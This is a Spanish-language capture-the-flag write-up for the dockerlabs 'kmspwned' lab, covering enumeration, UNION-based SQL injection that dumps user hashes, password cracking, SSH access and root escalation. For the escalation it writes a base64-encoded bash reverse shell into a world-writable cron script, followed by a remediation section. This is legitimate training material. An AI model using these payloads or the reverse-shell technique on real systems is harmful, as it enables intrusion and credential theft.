# kmspwned - SQLi
```md
By: B0mb0ncitoo

Este laboratorio lo puedes encontrar en dockerlabs.es de manera gratuita en la sección de Facil.
```

Recuerda que para montar el laboratorio tienes que iniciar tu docker.
```bash
sudo systemctl start docker 
```

## Escaneo Nmap
```bash
nmap -sS -sV -Pn -f 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Debian))
```

## Fuzzing
```bash
gobuster dir -u "http://172.17.0.2:80/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200                                            
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://172.17.0.2:80/
[+] Threads:        200
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2026/08/11 00:41:11 Starting gobuster
===============================================================
/admin (Status: 301)
/index.php (Status: 200)
/lib (Status: 301)
/server-status (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
===============================================================
2026/08/11 00:41:17 Finished
===============================================================
```

Ninguno de los directorios mostró información relevante, por lo que procederemos a revisar el código fuente.

```HTML
<!-- Panel de administracion disponible en /admin/ -->
<nav>
  <div class="logo">&#9729; Servi<span>Cloud</span></div>
  <div><a href="#">Dominios</a><a href="#">Hosting</a><a href="#">Servidores</a><a href="#">Aplicaciones</a><a href="#">Soporte</a></div>
  <div><a href="login.php">Acceso clientes</a><a href="registro.php" class="btn-nav">Crear cuenta</a></div>
</nav>
```

Procedemos a examinar registro.php y creamos un nuevo usuario e iniciar sesión.

| Campo | Valor |
| --- | --- |
| **Usuario** | test |
| **Correo** | test@hotmail.com |
| **Contraseña** | test |

Testeamos SQLi en el verificador de extensiones de dominio.

```SQL
' OR 1=1 -- '
```
La prueba arrojó la siguiente salida:
```json
{
  "estado": "ok",
  "mensaje": "Consulta ejecutada correctamente",
  "datos": [
    {"id": "1", "extension": "com", "precio": "9.99"},
    {"id": "2", "extension": "net", "precio": "8.99"},
    {"id": "3", "extension": "org", "precio": "7.99"},
    {"id": "4", "extension": "es",  "precio": "5.99"},
    {"id": "5", "extension": "eu",  "precio": "6.99"},
    {"id": "6", "extension": "io",  "precio": "19.99"},
    {"id": "7", "extension": "dev", "precio": "12.99"},
    {"id": "8", "extension": "app", "precio": "14.99"}
  ]
}
```
La API devolvió todas las filas de la tabla, no solo una extensión.

Desglose:

| Parte | Significado |
| --- | --- |
| **'** | 	Cierra la comilla del input original |
| **OR 1=1** | 	Condición que siempre es verdadera |
| **-- '** | 	Comentario que anula el resto de la consulta original |

Esto confirma dos cosas fundamentales:
```md
✅ La inyección SQL funciona.
✅ La consulta devuelve 8 filas con 3 columnas (id, extension, precio).
```
Podemos seguir usando el verificador de extensiones o bien, herramientas como Burp Suite.

Antes de continuar aplicamos un ORDER BY en SQLi que se usa principalmente para determinar el número de columnas que tiene la consulta original, lo cual es el primer paso crítico antes de montar un UNION SELECT.
```SQL
' ORDER BY 3 -- -
```
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
    ]
}
```
```SQL
' ORDER BY 4 -- -
```
```json
{
  "estado":"error",
  "mensaje":"Error en consulta",
  "datos":[
    ]
}
```
ERROR: no existe la cuarta columna.

Conclusión: la consulta tiene 3 columnas.

Ver el nombre de la base de datos.
```SQL
' UNION SELECT null, database(), null -- -
```
Desglose:

| Parte | Significado |
| --- | --- |
| **'** | 	Cierra la comilla del input original |
| **UNION SELECT** | 	Combina el resultado de dos consultas |
| **null** | 	Columna 1 vacía |
| **database()** | 		Función que devuelve el nombre de la BD actual |
| **null** | 	Columna 3 vacía |
| **-- -** | 	Comenta el resto de la consulta original |

```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"null",
            "extension":"servicloud_erp",
            "precio":"null"
        }
    ]
}
```
Listar todas las tablas.
```SQL
' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = database() -- -
```
Desglose:

| Parte | Significado |
| --- | --- |
| **'** | 		Cierra la comilla del input original |
| **UNION SELECT** | 		Combina el resultado de dos consultas |
| **null** | 	Columna 1 vacía |
| **table_name** | 		Nombre de cada tabla |
| **null** | 	Columna 3 vacía |
| **FROM information_schema.tables** | 	Base de datos del sistema |
| **WHERE table_schema = database()** | 	Filtra solo tablas de la BD actual |
| **-- -** | 	Comenta el resto de la consulta original |
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"null",
            "extension":"sc_extensiones",
            "precio":null
        },
        {
            "id":"null",
            "extension":"web_usuarios",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_clientes",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_flags",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_notas",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_facturas",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_usuarios",
            "precio":null
        }
    ]
}
```
Enumerar columnas de alguna tabla interesante.
```SQL
' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'sc_usuarios' -- -
```
Desglose:

| Parte | Significado |
| --- | --- |
| **'** | 		Cierra la comilla del input original |
| **UNION SELECT** | 		Combina el resultado de dos consultas |
| **null** | 	Columna 1 vacía |
| **column_name** | 		Nombre de cada columna |
| **null** | 	Columna 3 vacía |
| **FROM information_schema.tables** | 	Base de datos del sistema |
| **WHERE table_name = 'sc_usuarios'** | 	Filtra solo columnas de 'sc_usuarios' |
| **-- -** | 	Comenta el resto de la consulta original |
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"null",
            "extension":"id",
            "precio":null
        },
        {
            "id":"1",
            "extension":"usuario",
            "precio":null
        },
        {
            "id":"null",
            "extension":"password",
            "precio":null
        },
        {
            "id":"null",
            "extension":"email",
            "precio":null
        },
        {
            "id":"null",
            "extension":"rol",
            "precio":null
        },
        {
            "id":"null",
            "extension":"creado",
            "precio":null
        }
    ]
}
```
Extraer datos sensibles. 
```SQL
' UNION SELECT usuario,password,email FROM sc_usuarios -- -
```
Desglose:

| Parte | Significado |
| --- | --- |
| **'** | 		Cierra la comilla del input original |
| **UNION SELECT** | 		Combina el resultado de dos consultas |
| **usuario** | 	Enumerar columna usuario (reemplaza id) |
| **password** | 	Enumerar columna password (reemplaza extension) |
| **email** | 	Enumerar columna email (reemplaza precio) |
| **FROM sc_usuarios** | 	Tabla objetivo descubierta  |
| **-- -** | 	Comenta el resto de la consulta original |
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"admin",
            "extension":"c378985d629e99a4e86213db0cd5e70d",
            "precio":"admin@servicloud.dl"
        },
        {
            "id":"carlos",
            "extension":"7c6a180b36896a0a8c02787eeafb0e4c",
            "precio":"carlos@servicloud.dl"
        },
        {
            "id":"ana",
            "extension":"b33e0dcc9e2d7a1649d96831260b5698",
            "precio":"ana@servicloud.dl"
        }
    ]
}
```
Observamos que obtenemos hashes MD5 (Message Digest Algorithm 5). Utilizaremos crackstation.net que usa rainbow tables (tablas arcoíris) masivas para buscar el texto plano de hashes comunes sin salt.

| Usuario | Contraseña |
| --- | --- |
| **admin** | 	chocolate |
| **carlos** | 	password1 |
| **ana** | 	ana1234 |

Con los datos obtenidos, intentamos acceder a /admin/ sin éxito. Posteriormente, probamos las credenciales mediante SSH, logrando iniciar sesión con el usuario 'carlos'.
```bash
carlos@b378b68aaaa9:~$ whoami
carlos
carlos@b378b68aaaa9:~$ pwd
/home/carlos
carlos@b378b68aaaa9:~$ 
```
Listamos lo que tiene el usuario carlos
```bash
carlos@b378b68aaaa9:~$ ls 
notas.txt  user.txt
carlos@b378b68aaaa9:~$ cat user.txt
flag{l4t3r4l_mov3m3nt_ssh_pwn3d}
carlos@b378b68aaaa9:~$ cat notas.txt
Recordatorio: revisar permisos del script de backup en /opt/backup.sh
```
Revisamos lo que contiene y los permisos de backup.sh
```bash
carlos@b378b68aaaa9:~$ cat /opt/backup.sh
#!/bin/bash
# Copia de seguridad diaria
tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz /var/www/html/ 2>/dev/null
echo "Backup: $(date)" >> /var/log/backup.log
carlos@b378b68aaaa9:~$ ls -l /opt/backup.sh
-rwxrwxrwx 1 root root 157 Jul  8 17:13 /opt/backup.sh
```
Observamos que se realiza una copia de seguridad y que el script tiene -rwxrwxrwx lo que lo vuelve una falla de seguridad, esto nos dice, que cualquier usuario del sistema puede leer, escribir y ejecutar el script. Solo nos hace falta ver, ¿cada cuanto se ejecuta este script? Por lo que nos vamos a examinar /etc/crontab donde Crontab (cron table) es un programador de tareas en sistemas Unix/Linux que permite ejecutar comandos o scripts de forma automática y periódica en fechas y horas específicas. 
```bash
carlos@b378b68aaaa9:~$ cat /etc/crontab

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /opt/backup.sh
```
Vemos que backup.sh se ejecuta cada minuto, por lo que procedemos a inyectar un payload de reverse shell en el script de backup. El payload lo codificamos a Base64 para evitar problemas con caracteres especiales en la shell.
```bash
echo -n "(bash >& /dev/tcp/172.17.0.1/4444 0>&1) &" | base64
KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=
```
```bash
carlos@b378b68aaaa9:~$ echo 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash' > /opt/backup.sh
```
Montamos un listener en una terminal de nuestra maquina y nos conectamos. 
```bash
nc -lvnp 4444 
```
Una vez conectamos e interactuamos.
```bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```
Despues de interactuar, logramos ser root y terminar el laboratorio.

**Remediación SQLi**

La solución se aplica en múltiples capas. Ninguna medida única es suficiente si se implementa mal. 
```md
1. Consultas Preparadas (Prepared Statements). Separa el código SQL de los datos, haciendo imposible la inyección.

2. Validación y Saneamiento del Input (Defensa en Profundidad). Aunque las consultas preparadas son suficientes, validar el input añade una capa extra.

3. Principio de Mínimo Privilegio en la Base de Datos. El usuario de la BD usado por la aplicación nunca debe ser root o tener permisos que no necesita.

5. Deshabilitar Mensajes de Error Detallados. Los errores SQL en producción revelan información crítica.

6. Web Application Firewall (WAF). Un WAF (modsecurity, Cloudflare, AWS WAF) puede detectar y bloquear patrones de ataque

7. Actualizar y Parchear. Mantén actualizado
```
Como medida final, se recomienda restringir los permisos de los ejecutables del sistema únicamente a usuarios autorizados.

